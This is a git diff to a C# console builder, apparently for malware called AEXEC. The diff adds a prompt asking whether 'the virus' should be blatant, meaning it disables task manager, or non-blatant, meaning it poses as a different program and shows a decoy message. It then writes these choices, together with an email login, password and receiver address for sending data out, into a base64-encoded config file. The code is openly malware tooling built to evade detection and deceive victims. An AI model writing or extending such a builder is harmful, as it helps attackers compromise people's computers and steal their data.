@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net.Mime;
 namespace AEXEC
@@ -35,9 +36,29 @@ agreed to it.
             string password = Console.ReadLine();
             Console.WriteLine("Receiver Email address: ");
             string receiver = Console.ReadLine();
+            Console.WriteLine("Should the virus be blatant?");
+            Console.WriteLine("Blatant virus will disable task manager and do some more stuff");
+            Console.WriteLine("Non-blatant virus will not disable task manager, and will try to look like different program.");
+            Console.WriteLine("Enter 0 for blatant and 1 for non-blatant");
+            string bl = Console.ReadLine();
+            string blatant;
+            string msg = String.Empty;
+            switch (bl)
+            {
+                case "0":
+                    blatant = "true";
+                    break;
+                case "1":
+                    blatant = "false";
+                    Console.WriteLine("Enter message, that will be show to user at start: ");
+                    msg = Console.ReadLine();
+;                    break;
+                default:
+                    goto case "1";
+            }
             Console.WriteLine("Writing config file...");
             
-            string data = "{\"mail\":{\"login\": \""+email+" \",\"password\": \""+password+"\", \"receiver\": \""+receiver+"\"}}";
+            string data = "{\"mail\":{\"login\": \""+email+" \",\"password\": \""+password+"\", \"receiver\": \""+receiver+"\"}, \"blatant\":\""+blatant+"\", \"hideMessage\": \""+msg+"\"}";
             byte[] bytes = System.Text.Encoding.UTF8.GetBytes(data);
             string converted = Convert.ToBase64String(bytes);
             File.WriteAllText($"{Directory.GetCurrentDirectory()}\\data.enc", converted);
